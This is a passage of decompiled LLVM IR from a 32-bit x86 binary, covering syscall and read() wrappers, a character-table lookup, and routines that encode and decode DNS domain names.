  uselistorder i32 8, { 67, 66, 68, 8, 9, 69, 70, 71, 72, 73, 74, 0, 75, 10, 7, 86, 87, 88, 37, 144, 39, 16, 17, 18, 19, 40, 20, 21, 22, 41, 23, 42, 24, 43, 44, 89, 145, 146, 147, 148, 149, 150, 38, 151, 152, 153, 172, 173, 174, 33, 179, 34, 180, 35, 54, 25, 56, 61, 97, 57, 58, 98, 99, 100, 101, 102, 103, 104, 1, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 2, 115, 116, 117, 118, 119, 46, 3, 47, 4, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 45, 137, 138, 5, 139, 140, 141, 142, 6, 143, 76, 77, 11, 12, 36, 178, 78, 90, 91, 13, 14, 55, 154, 155, 156, 157, 159, 160, 161, 158, 162, 163, 164, 165, 26, 27, 166, 167, 168, 169, 170, 171, 15, 175, 176, 177, 92, 93, 94, 95, 59, 60, 96, 48, 49, 50, 28, 29, 51, 30, 62, 31, 52, 32, 63, 64, 65, 79, 80, 81, 82, 53, 83, 84, 85 }
  uselistorder i32 -32, { 3, 0, 1, 2 }
  uselistorder i32 32, { 33, 17, 34, 35, 16, 20, 29, 0, 1, 2, 3, 4, 5, 36, 25, 37, 38, 39, 23, 24, 44, 14, 58, 21, 28, 30, 31, 32, 15, 7, 6, 8, 9, 26, 10, 18, 40, 41, 42, 45, 46, 19, 47, 48, 49, 50, 51, 52, 53, 11, 54, 55, 27, 56, 57, 43, 22, 13, 12 }
  uselistorder i32 4, { 119, 120, 121, 115, 113, 114, 116, 117, 118, 18, 1, 122, 123, 124, 125, 126, 127, 128, 129, 130, 24, 73, 74, 75, 25, 26, 27, 131, 45, 19, 77, 2, 3, 216, 217, 218, 219, 220, 221, 4, 160, 76, 255, 97, 132, 133, 134, 135, 136, 137, 53, 138, 139, 140, 141, 56, 28, 142, 143, 144, 145, 29, 30, 31, 57, 32, 33, 34, 35, 146, 36, 147, 58, 37, 59, 60, 5, 161, 162, 163, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 49, 232, 256, 233, 257, 258, 264, 265, 0, 269, 270, 271, 259, 46, 70, 98, 99, 260, 261, 262, 263, 6, 78, 79, 80, 81, 82, 61, 100, 101, 102, 54, 170, 171, 172, 173, 83, 84, 85, 86, 87, 55, 7, 88, 89, 266, 267, 176, 177, 178, 179, 180, 181, 8, 182, 183, 184, 185, 186, 187, 188, 189, 174, 175, 190, 48, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 16, 211, 212, 214, 213, 9, 62, 148, 149, 47, 150, 151, 152, 153, 20, 10, 21, 268, 11, 154, 91, 234, 12, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 38, 39, 71, 22, 252, 253, 254, 164, 13, 165, 50, 166, 92, 93, 94, 51, 52, 23, 95, 96, 167, 168, 63, 64, 65, 40, 90, 41, 42, 66, 103, 43, 44, 104, 105, 106, 107, 108, 67, 109, 110, 111, 112, 155, 68, 156, 157, 158, 69, 159, 169, 17, 14, 215, 15, 72 }
  uselistorder i32* @ebp, { 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 9, 10, 11, 1, 12, 13, 14, 4, 46, 47, 48, 53, 49, 50, 51, 52, 54, 151, 152, 55, 56, 57, 58, 59, 60, 61, 153, 154, 155, 156, 157, 8, 23, 24, 15, 16, 17, 25, 26, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 149, 145, 146, 147, 148, 3, 150, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 5, 158, 159, 160, 161, 162, 90, 2, 91, 92, 93, 94, 95, 96, 97, 98, 99, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 0, 174, 18, 19, 20, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 113, 112, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 175, 176, 177, 128, 129, 130, 21, 22, 27, 28, 29, 30, 73, 74, 75, 76, 77, 78, 79, 80, 81, 6, 82, 83, 84, 85, 7, 86, 87, 88, 89, 131, 178, 179 }
  uselistorder i32 %arg9, { 3, 0, 1, 2 }
  uselistorder i32 %arg8, { 3, 2, 1, 0 }
  uselistorder i32 %arg7, { 1, 0, 2, 3 }
  uselistorder i32 %arg6, { 1, 0, 3, 2 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_80521f9, { 9, 8, 0, 10, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_80521d9, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_80521bf.outer.backedge, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8052175, { 1, 0 }
  uselistorder label %dec_label_pc_8052159, { 1, 0 }
  uselistorder label %dec_label_pc_805211c, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_80520e3.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8052109, { 1, 0 }
  uselistorder label %dec_label_pc_80520d7, { 1, 0 }
  uselistorder label %dec_label_pc_80520c0, { 1, 0 }
  uselistorder label %dec_label_pc_80520c0.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_80520a9, { 1, 0 }
  uselistorder label %dec_label_pc_805206e, { 1, 0 }
  uselistorder label %dec_label_pc_8051fc5, { 1, 0 }
  uselistorder label %dec_label_pc_8051f55, { 1, 0 }
}

define i32 @function_8052208(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8052208:
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_805220a = load i32, i32* @ebx, align 4
  store i32 %v0_805220a, i32* %stack_var_-12, align 4
  %v2_805221e = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_805221e, i32* %esi.global-to-local, align 4
  %v1_8052235 = call i32 @int80_syscall(i32 140)
  store i32 %v1_8052235, i32* %esi.global-to-local, align 4
  %tmp18 = icmp ult i32 %v1_8052235, -4095
  br i1 %tmp18, label %dec_label_pc_805224f, label %dec_label_pc_8052241

dec_label_pc_8052241:                             ; preds = %dec_label_pc_8052208
  %v2_8052222 = ashr i32 %arg3, 31
  %v1_8052241 = call i32 @function_804b774(i32 %v2_8052222)
  %v0_8052246 = load i32, i32* %esi.global-to-local, align 4
  %v1_8052246 = sub i32 0, %v0_8052246
  %v2_8052248 = inttoptr i32 %v1_8052241 to i32*
  store i32 %v1_8052246, i32* %v2_8052248, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  %v2_8052263.pre.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_8052253

dec_label_pc_805224f:                             ; preds = %dec_label_pc_8052208
  %v1_805224f = icmp eq i32 %v1_8052235, 0
  br i1 %v1_805224f, label %dec_label_pc_8052258, label %dec_label_pc_8052253

dec_label_pc_8052253:                             ; preds = %dec_label_pc_805224f, %dec_label_pc_8052241
  %v2_8052263.pre = phi i32 [ %v0_805220a, %dec_label_pc_805224f ], [ %v2_8052263.pre.pre, %dec_label_pc_8052241 ]
  %v0_8052253 = phi i32 [ %v1_8052235, %dec_label_pc_805224f ], [ -1, %dec_label_pc_8052241 ]
  %v1_8052255 = ashr i32 %v0_8052253, 31
  br label %dec_label_pc_8052260

dec_label_pc_8052258:                             ; preds = %dec_label_pc_805224f
  %v3_8052258 = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_8052260

dec_label_pc_8052260:                             ; preds = %dec_label_pc_8052253, %dec_label_pc_8052258
  %v2_8052263 = phi i32 [ %v2_8052263.pre, %dec_label_pc_8052253 ], [ %v0_805220a, %dec_label_pc_8052258 ]
  %v0_8052266 = phi i32 [ %v0_8052253, %dec_label_pc_8052253 ], [ %v3_8052258, %dec_label_pc_8052258 ]
  %storemerge = phi i32 [ %v1_8052255, %dec_label_pc_8052253 ], [ %tmp, %dec_label_pc_8052258 ]
  store i32 %storemerge, i32* @edx, align 4
  store i32 %v2_8052263, i32* @ebx, align 4
  ret i32 %v0_8052266

; uselistorder directives
  uselistorder i32 %v1_8052235, { 1, 2, 0, 3 }
  uselistorder i32 %v0_805220a, { 1, 0, 2 }
  uselistorder i32 31, { 23, 24, 12, 25, 26, 18, 19, 27, 28, 10, 2, 3, 0, 1, 8, 17, 13, 14, 15, 6, 7, 4, 5, 11, 29, 30, 16, 9, 20, 21, 22 }
  uselistorder i32 140, { 1, 0 }
  uselistorder label %dec_label_pc_8052260, { 1, 0 }
}

define i32 @function_8052268(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8052268:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8052268 = load i32, i32* @edi, align 4
  store i32 %v0_8052268, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_8052278 = load i32, i32* @ebx, align 4
  %v4_8052280 = call i32 @read(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v0_8052278, i32* @ebx, align 4
  store i32 %v4_8052280, i32* %edi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v4_8052280, -4095
  br i1 %tmp11, label %dec_label_pc_8052298, label %dec_label_pc_805228c

dec_label_pc_805228c:                             ; preds = %dec_label_pc_8052268
  %v1_805228c = call i32 @function_804b774(i32 %v0_8052278)
  %v0_8052291 = load i32, i32* %edi.global-to-local, align 4
  %v1_8052291 = sub i32 0, %v0_8052291
  %v2_8052293 = inttoptr i32 %v1_805228c to i32*
  store i32 %v1_8052291, i32* %v2_8052293, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8052298

dec_label_pc_8052298:                             ; preds = %dec_label_pc_8052268, %dec_label_pc_805228c
  %v0_8052298 = phi i32 [ %v4_8052280, %dec_label_pc_8052268 ], [ -1, %dec_label_pc_805228c ]
  %v2_805229c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805229c, i32* @edi, align 4
  ret i32 %v0_8052298

; uselistorder directives
  uselistorder i32 %v4_8052280, { 1, 0, 2 }
  uselistorder i32 %v0_8052278, { 1, 0 }
  uselistorder i32 (i32)* @function_804b774, { 37, 25, 44, 67, 66, 40, 43, 36, 24, 23, 42, 32, 31, 17, 22, 21, 56, 13, 12, 55, 11, 50, 30, 10, 64, 9, 8, 7, 6, 54, 65, 5, 4, 2, 39, 3, 29, 49, 48, 47, 46, 63, 62, 61, 28, 27, 41, 20, 19, 18, 0, 35, 34, 53, 52, 51, 14, 45, 38, 16, 1, 15, 26, 33, 60, 59, 58, 57 }
  uselistorder i32 -4095, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 31, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30 }
  uselistorder label %dec_label_pc_8052298, { 1, 0 }
}

define i32 @function_80522a0(i32 %arg1) local_unnamed_addr {
dec_label_pc_80522a0:
  store i32 %arg1, i32* @edx, align 4
  %v1_80522a4 = add i32 %arg1, 128
  %v6_80522af = icmp ugt i32 %v1_80522a4, 383
  br i1 %v6_80522af, label %dec_label_pc_80522ba, label %dec_label_pc_80522b1

dec_label_pc_80522b1:                             ; preds = %dec_label_pc_80522a0
  %v0_80522b1 = load i32, i32* bitcast (i32** @global_var_8056088.134 to i32*), align 8
  %v2_80522b6 = mul i32 %arg1, 2
  %v3_80522b6 = add i32 %v0_80522b1, %v2_80522b6
  %v4_80522b6 = inttoptr i32 %v3_80522b6 to i16*
  %v5_80522b6 = load i16, i16* %v4_80522b6, align 2
  %v6_80522b6 = sext i16 %v5_80522b6 to i32
  store i32 %v6_80522b6, i32* @edx, align 4
  br label %dec_label_pc_80522ba

dec_label_pc_80522ba:                             ; preds = %dec_label_pc_80522a0, %dec_label_pc_80522b1
  %v0_80522ba = phi i32 [ %arg1, %dec_label_pc_80522a0 ], [ %v6_80522b6, %dec_label_pc_80522b1 ]
  ret i32 %v0_80522ba

; uselistorder directives
  uselistorder i32 65536, { 0, 2, 3, 1, 4, 65, 5, 6, 7, 8, 9, 11, 10, 13, 12, 15, 14, 17, 16, 18, 19, 20, 66, 68, 21, 23, 22, 31, 24, 32, 25, 33, 26, 34, 27, 35, 28, 36, 29, 37, 30, 43, 38, 44, 39, 45, 40, 46, 41, 47, 42, 49, 48, 50, 51, 53, 52, 55, 54, 57, 56, 58, 59, 61, 64, 60, 62, 63, 67 }
  uselistorder i32 128, { 15, 11, 13, 2, 3, 6, 12, 7, 8, 14, 4, 9, 10, 16, 0, 17, 18, 5, 1, 19 }
  uselistorder label %dec_label_pc_80522ba, { 1, 0 }
}

define i32 @function_80522c0(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80522c0:
  %v4_80522c1 = ptrtoint i8* %arg1 to i32
  %v2_80522c9 = mul i32 %arg2, 256
  %v3_80522c9 = and i32 %v2_80522c9, 65280
  %v4_80522c9 = and i32 %arg2, -65281
  %v5_80522c9 = or i32 %v3_80522c9, %v4_80522c9
  %v8_80522cb.pre = load i1, i1* @df, align 1
  %v9_80522cb = select i1 %v8_80522cb.pre, i32 -1, i32 1
  br label %dec_label_pc_80522cb

dec_label_pc_80522cb:                             ; preds = %dec_label_pc_80522d0, %dec_label_pc_80522c0
  %v4_80522cb = phi i32 [ %v6_80522cb, %dec_label_pc_80522d0 ], [ %v5_80522c9, %dec_label_pc_80522c0 ]
  %v7_80522cb = phi i32 [ %v10_80522cb, %dec_label_pc_80522d0 ], [ %v4_80522c1, %dec_label_pc_80522c0 ]
  %v1_80522cb = inttoptr i32 %v7_80522cb to i8*
  %v2_80522cb = load i8, i8* %v1_80522cb, align 1
  %v10_80522cb = add i32 %v7_80522cb, %v9_80522cb
  %v3_80522cc = udiv i32 %v4_80522cb, 256
  %v4_80522cc = trunc i32 %v3_80522cc to i8
  %v16_80522cc = icmp eq i8 %v2_80522cb, %v4_80522cc
  br i1 %v16_80522cc, label %dec_label_pc_80522d9.loopexit, label %dec_label_pc_80522d0

dec_label_pc_80522d0:                             ; preds = %dec_label_pc_80522cb
  %v3_80522cb = zext i8 %v2_80522cb to i32
  %v5_80522cb = and i32 %v4_80522cb, -256
  %v6_80522cb = or i32 %v3_80522cb, %v5_80522cb
  %v4_80522d0 = icmp eq i8 %v2_80522cb, 0
  %v1_80522d2 = icmp eq i1 %v4_80522d0, false
  br i1 %v1_80522d2, label %dec_label_pc_80522cb, label %dec_label_pc_80522d4

dec_label_pc_80522d4:                             ; preds = %dec_label_pc_80522d0
  br label %dec_label_pc_80522d9

dec_label_pc_80522d9.loopexit:                    ; preds = %dec_label_pc_80522cb
  %phitmp = add i32 %v10_80522cb, -1
  br label %dec_label_pc_80522d9

dec_label_pc_80522d9:                             ; preds = %dec_label_pc_80522d9.loopexit, %dec_label_pc_80522d4
  %v0_80522d9 = phi i32 [ 0, %dec_label_pc_80522d4 ], [ %phitmp, %dec_label_pc_80522d9.loopexit ]
  ret i32 %v0_80522d9

; uselistorder directives
  uselistorder i8 %v2_80522cb, { 1, 2, 0 }
  uselistorder i32 %v4_80522cb, { 1, 0 }
  uselistorder i32 -256, { 27, 1, 28, 0, 29, 12, 13, 30, 31, 3, 15, 14, 2, 32, 33, 6, 34, 4, 35, 5, 36, 37, 8, 17, 16, 7, 49, 50, 43, 51, 52, 53, 54, 55, 56, 68, 57, 19, 20, 21, 18, 69, 47, 48, 22, 9, 23, 70, 38, 44, 58, 59, 60, 61, 62, 10, 63, 64, 11, 65, 66, 67, 45, 24, 25, 26, 39, 40, 41, 42, 46 }
  uselistorder i1* @df, { 1, 4, 5, 11, 12, 0, 2, 13, 14, 15, 16, 3, 25, 26, 6, 7, 8, 9, 10, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @function_80522e0(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_80522e0:
  %ebx.global-to-local = alloca i32, align 4
  %v0_80522e1 = load i32, i32* @edi, align 4
  %v0_80522e2 = load i32, i32* @esi, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v4_80522e9 = ptrtoint i8* %arg1 to i32
  store i32 %v4_80522e9, i32* @edi, align 4
  %v1_80523485 = icmp eq i8* %arg1, null
  br i1 %v1_80523485, label %dec_label_pc_8052351, label %dec_label_pc_805234c.lr.ph

dec_label_pc_805234c.lr.ph:                       ; preds = %dec_label_pc_80522e0
  br label %dec_label_pc_805234c

dec_label_pc_80522ef:                             ; preds = %dec_label_pc_805234c
  %v0_80522ef = load i32, i32* @edx, align 4
  %v9_80522f4 = call i32 @function_80522c0(i8* %v1_805234c, i32 46, i32 %v0_80522ef, i32 %v0_80522ef)
  %v1_80522fe = icmp eq i32 %v9_80522f4, 0
  br i1 %v1_80522fe, label %dec_label_pc_8052308, label %dec_label_pc_8052302

dec_label_pc_8052302:                             ; preds = %dec_label_pc_80522ef
  %v1_8052304 = load i32, i32* @edi, align 4
  %v2_8052304 = sub i32 %v9_80522f4, %v1_8052304
  br label %dec_label_pc_8052316

dec_label_pc_8052308:                             ; preds = %dec_label_pc_80522ef
  %v0_805230b = load i32, i32* @edi, align 4
  %v5_805230b = inttoptr i32 %v0_805230b to i8*
  %v3_805230c = call i32 @function_804d1ac(i8* %v5_805230b)
  br label %dec_label_pc_8052316

dec_label_pc_8052316:                             ; preds = %dec_label_pc_8052302, %dec_label_pc_8052308
  %v0_8052329 = phi i32 [ %v2_8052304, %dec_label_pc_8052302 ], [ %v3_805230c, %dec_label_pc_8052308 ]
  store i32 %v0_8052329, i32* @esi, align 4
  %v1_8052316 = icmp eq i32 %v0_8052329, 0
  %v3_8052316 = trunc i32 %v0_8052329 to i8
  br i1 %v1_8052316, label %dec_label_pc_8052365, label %dec_label_pc_805231a

dec_label_pc_805231a:                             ; preds = %dec_label_pc_8052316
  %v1_805231e = load i32, i32* %ebx.global-to-local, align 4
  %v2_805231e = sub i32 %arg3, %v1_805231e
  %v1_8052320 = add i32 %v2_805231e, -1
  %v7_8052321 = icmp ult i32 %v0_8052329, %v1_8052320
  %v1_8052323 = icmp eq i1 %v7_8052321, false
  br i1 %v1_8052323, label %dec_label_pc_8052365, label %dec_label_pc_8052325

dec_label_pc_8052325:                             ; preds = %dec_label_pc_805231a
  store i32 %arg2, i32* @edx, align 4
  %v4_805232b = add i32 %v1_805231e, %arg2
  %v5_805232b = inttoptr i32 %v4_805232b to i8*
  store i8 %v3_8052316, i8* %v5_805232b, align 1
  %v0_805232e = load i32, i32* %ebx.global-to-local, align 4
  %v1_805232e = add i32 %v0_805232e, 1
  %v0_8052330 = load i32, i32* @edx, align 4
  %v2_8052332 = add i32 %v1_805232e, %v0_8052330
  %v0_8052334 = load i32, i32* @esi, align 4
  %v0_8052335 = load i32, i32* @edi, align 4
  %v2_8052337 = add i32 %v0_8052334, %v1_805232e
  store i32 %v2_8052337, i32* %ebx.global-to-local, align 4
  %tmp30 = inttoptr i32 %v2_8052332 to i16*
  %v7_8052339 = call i32 @function_804d150(i16* %tmp30, i32 %v0_8052335, i32 %v0_8052334)
  %v1_8052345 = add i32 %v9_80522f4, 1
  br i1 %v1_80522fe, label %dec_label_pc_8052351, label %dec_label_pc_8052348

dec_label_pc_8052348:                             ; preds = %dec_label_pc_8052325
  store i32 %v1_8052345, i32* @edi, align 4
  %v1_8052348 = icmp eq i32 %v1_8052345, 0
  br i1 %v1_8052348, label %dec_label_pc_8052351, label %dec_label_pc_805234c

dec_label_pc_805234c:                             ; preds = %dec_label_pc_805234c.lr.ph, %dec_label_pc_8052348
  %v0_80522f3 = phi i32 [ %v4_80522e9, %dec_label_pc_805234c.lr.ph ], [ %v1_8052345, %dec_label_pc_8052348 ]
  %v1_805234c = inttoptr i32 %v0_80522f3 to i8*
  %v2_805234c = load i8, i8* %v1_805234c, align 1
  %v3_805234c = icmp eq i8 %v2_805234c, 0
  %v1_805234f = icmp eq i1 %v3_805234c, false
  br i1 %v1_805234f, label %dec_label_pc_80522ef, label %dec_label_pc_8052351

dec_label_pc_8052351:                             ; preds = %dec_label_pc_8052348, %dec_label_pc_805234c, %dec_label_pc_8052325, %dec_label_pc_80522e0
  %tmp31 = icmp slt i32 %arg3, 1
  br i1 %tmp31, label %dec_label_pc_8052365, label %dec_label_pc_8052358

dec_label_pc_8052358:                             ; preds = %dec_label_pc_8052351
  %v1_805235c = load i32, i32* %ebx.global-to-local, align 4
  %v2_805235c = add i32 %v1_805235c, %arg2
  %v3_805235c = inttoptr i32 %v2_805235c to i8*
  store i8 0, i8* %v3_805235c, align 1
  %v0_8052360 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052360 = add i32 %v0_8052360, 1
  br label %dec_label_pc_8052368

dec_label_pc_8052365:                             ; preds = %dec_label_pc_805231a, %dec_label_pc_8052316, %dec_label_pc_8052351
  br label %dec_label_pc_8052368

dec_label_pc_8052368:                             ; preds = %dec_label_pc_8052358, %dec_label_pc_8052365
  %storemerge3 = phi i32 [ %v1_8052360, %dec_label_pc_8052358 ], [ -1, %dec_label_pc_8052365 ]
  store i32 %v0_80522e2, i32* @esi, align 4
  store i32 %v0_80522e1, i32* @edi, align 4
  ret i32 %storemerge3

; uselistorder directives
  uselistorder i8* %v1_805234c, { 1, 0 }
  uselistorder i32 %v1_8052345, { 0, 2, 1 }
  uselistorder i32 %v0_8052334, { 1, 0 }
  uselistorder i1 %v1_80522fe, { 1, 0 }
  uselistorder i32 %v9_80522f4, { 2, 0, 1 }
  uselistorder i32* %ebx.global-to-local, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 (i8*)* @function_804d1ac, { 1, 4, 5, 3, 2, 6, 7, 8, 0 }
  uselistorder i32 46, { 1, 2, 0, 3 }
  uselistorder i8* null, { 3, 4, 2, 6, 0, 1, 5, 7, 8, 9, 10, 11, 12 }
  uselistorder label %dec_label_pc_8052368, { 1, 0 }
  uselistorder label %dec_label_pc_8052365, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052351, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_805234c, { 1, 0 }
  uselistorder label %dec_label_pc_8052316, { 1, 0 }
}

define i32 @function_8052370(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8052370:
  %ebp.global-to-local = alloca i32, align 4
  %v0_8052372 = load i32, i32* @esi, align 4
  store i32 %arg2, i32* @edx, align 4
  %v4_805237b = icmp eq i32 %arg1, 0
  br i1 %v4_805237b, label %dec_label_pc_805243c, label %dec_label_pc_8052386

dec_label_pc_8052386:                             ; preds = %dec_label_pc_8052370
  store i32 0, i32* %ebp.global-to-local, align 4
  store i32 0, i32* @ecx, align 4
  %v2_80524242740 = add i32 %arg2, %arg1
  %v3_80524242841 = inttoptr i32 %v2_80524242740 to i8*
  %v4_80524242942 = load i8, i8* %v3_80524242841, align 1
  %v1_80524283144 = icmp eq i8 %v4_80524242942, 0
  %v1_805242a3245 = icmp eq i1 %v1_80524283144, false
  br i1 %v1_805242a3245, label %dec_label_pc_8052394.lr.ph, label %dec_label_pc_8052430

dec_label_pc_8052394:                             ; preds = %dec_label_pc_8052394.lr.ph, %dec_label_pc_80523ad
  %v0_805239e = phi i32 [ %v0_805239e.pre, %dec_label_pc_8052394.lr.ph ], [ %v4_80523b8, %dec_label_pc_80523ad ]
  %v8_805239438 = phi i1 [ %v8_80523943350, %dec_label_pc_8052394.lr.ph ], [ true, %dec_label_pc_80523ad ]
  %v5_805242437.in = phi i8 [ %v5_80524243049.in, %dec_label_pc_8052394.lr.ph ], [ %v4_8052424, %dec_label_pc_80523ad ]
  %stack_var_-17.136 = phi i8 [ %stack_var_-17.1.ph48, %dec_label_pc_8052394.lr.ph ], [ 0, %dec_label_pc_80523ad ]
  %v0_805239b35 = phi i32 [ %v0_805239b.ph46, %dec_label_pc_8052394.lr.ph ], [ %v2_80523c7, %dec_label_pc_80523ad ]
  %v5_805242437 = zext i8 %v5_805242437.in to i32
  %v1_805239b = add i32 %v0_805239b35, 1
  store i32 %v1_805239b, i32* @esi, align 4
  %v3_805239e = select i1 %v8_805239438, i32 2, i32 1
  %v4_805239e = add i32 %v3_805239e, %v0_805239e
  store i32 %v4_805239e, i32* %ebp.global-to-local, align 4
  %v1_80523a1 = and i32 %v5_805242437, 192
  %v6_80523a6 = icmp eq i32 %v1_80523a1, 192
  %v1_80523ab = icmp eq i1 %v6_80523a6, false
  br i1 %v1_80523ab, label %dec_label_pc_80523d0, label %dec_label_pc_80523ad

dec_label_pc_80523ad:                             ; preds = %dec_label_pc_8052394
  %v4_80523b8 = add i32 %v3_805239e, %v4_805239e
  store i32 %v4_80523b8, i32* %ebp.global-to-local, align 4
  %tmp = urem i8 %v5_805242437.in, 64
  %v1_80523bb = zext i8 %tmp to i32
  %v2_80523be = add i32 %v1_805239b, %arg1
  %v3_80523be = inttoptr i32 %v2_80523be to i8*
  %v4_80523be = load i8, i8* %v3_80523be, align 1
  %v5_80523be = zext i8 %v4_80523be to i32
  %v2_80523c2 = mul nuw nsw i32 %v1_80523bb, 256
  %v2_80523c7 = or i32 %v5_80523be, %v2_80523c2
  store i32 %v2_80523c7, i32* @edx, align 4
  store i32 %v1_80523ed.ph47, i32* @ecx, align 4
  %v2_8052424 = add i32 %v2_80523c7, %arg1
  %v3_8052424 = inttoptr i32 %v2_8052424 to i8*
  %v4_8052424 = load i8, i8* %v3_8052424, align 1
  %v1_8052428 = icmp eq i8 %v4_8052424, 0
  %v1_805242a = icmp eq i1 %v1_8052428, false
  br i1 %v1_805242a, label %dec_label_pc_8052394, label %dec_label_pc_8052430

dec_label_pc_80523d0:                             ; preds = %dec_label_pc_8052394
  %v2_80523d0 = add i32 %v5_805242437, %v1_80523ed.ph47
  %v1_80523d9 = add i32 %v2_80523d0, 1
  store i32 %v1_80523d9, i32* @edi, align 4
  %v10_80523da = icmp ult i32 %v1_80523d9, %arg4
  %v1_80523de = icmp eq i1 %v10_80523da, false
  br i1 %v1_80523de, label %dec_label_pc_805243c, label %dec_label_pc_80523e0

dec_label_pc_80523e0:                             ; preds = %dec_label_pc_80523d0
  %v2_80523e6 = add i32 %v1_805239b, %arg1
  %v2_80523ed = add i32 %v1_80523ed.ph47, %arg3
  %v3_80523f0 = inttoptr i32 %v2_80523ed to i16*
  %v4_80523f0 = call i32 @function_804d150(i16* %v3_80523f0, i32 %v2_80523e6, i32 %v5_805242437)
  %v0_80523f8 = load i32, i32* @esi, align 4
  %v2_80523f8 = add i32 %v0_80523f8, %v5_805242437
  store i32 %v2_80523f8, i32* @edx, align 4
  br i1 %v8_805239438, label %dec_label_pc_8052404, label %dec_label_pc_8052402

dec_label_pc_8052402:                             ; preds = %dec_label_pc_80523e0
  %v0_8052402 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8052402 = add i32 %v0_8052402, %v5_805242437
  store i32 %v2_8052402, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8052404

dec_label_pc_8052404:                             ; preds = %dec_label_pc_80523e0, %dec_label_pc_8052402
  %v4_805241b = add i32 %v2_80523d0, %arg3
  %v5_805241b = inttoptr i32 %v4_805241b to i8*
  store i8 46, i8* %v5_805241b, align 1
  %v0_805241e.pre = load i32, i32* @edi, align 4
  %v1_8052424.pre.pre = load i32, i32* @edx, align 4
  store i32 %v0_805241e.pre, i32* @ecx, align 4
  %v2_805242427 = add i32 %v1_8052424.pre.pre, %arg1
  %v3_805242428 = inttoptr i32 %v2_805242427 to i8*
  %v4_805242429 = load i8, i8* %v3_805242428, align 1
  %v1_805242831 = icmp eq i8 %v4_805242429, 0
  %v1_805242a32 = icmp eq i1 %v1_805242831, false
  %v8_805239433 = icmp eq i8 %stack_var_-17.136, 0
  %v0_805239e.pre.pre = load i32, i32* %ebp.global-to-local, align 4
  br i1 %v1_805242a32, label %dec_label_pc_8052394.lr.ph, label %dec_label_pc_8052430

dec_label_pc_8052394.lr.ph:                       ; preds = %dec_label_pc_8052404, %dec_label_pc_8052386
  %v0_805239e.pre = phi i32 [ 0, %dec_label_pc_8052386 ], [ %v0_805239e.pre.pre, %dec_label_pc_8052404 ]
  %v8_80523943350 = phi i1 [ false, %dec_label_pc_8052386 ], [ %v8_805239433, %dec_label_pc_8052404 ]
  %v5_80524243049.in = phi i8 [ %v4_80524242942, %dec_label_pc_8052386 ], [ %v4_805242429, %dec_label_pc_8052404 ]
  %stack_var_-17.1.ph48 = phi i8 [ 1, %dec_label_pc_8052386 ], [ %stack_var_-17.136, %dec_label_pc_8052404 ]
  %v1_80523ed.ph47 = phi i32 [ 0, %dec_label_pc_8052386 ], [ %v0_805241e.pre, %dec_label_pc_8052404 ]
  %v0_805239b.ph46 = phi i32 [ %arg2, %dec_label_pc_8052386 ], [ %v1_8052424.pre.pre, %dec_label_pc_8052404 ]
  br label %dec_label_pc_8052394

dec_label_pc_8052430:                             ; preds = %dec_label_pc_8052404, %dec_label_pc_80523ad, %dec_label_pc_8052386
  %v0_8052435 = phi i32 [ 0, %dec_label_pc_8052386 ], [ %v4_80523b8, %dec_label_pc_80523ad ], [ %v0_805239e.pre.pre, %dec_label_pc_8052404 ]
  %v8_8052394.lcssa = phi i1 [ false, %dec_label_pc_8052386 ], [ true, %dec_label_pc_80523ad ], [ %v8_805239433, %dec_label_pc_8052404 ]
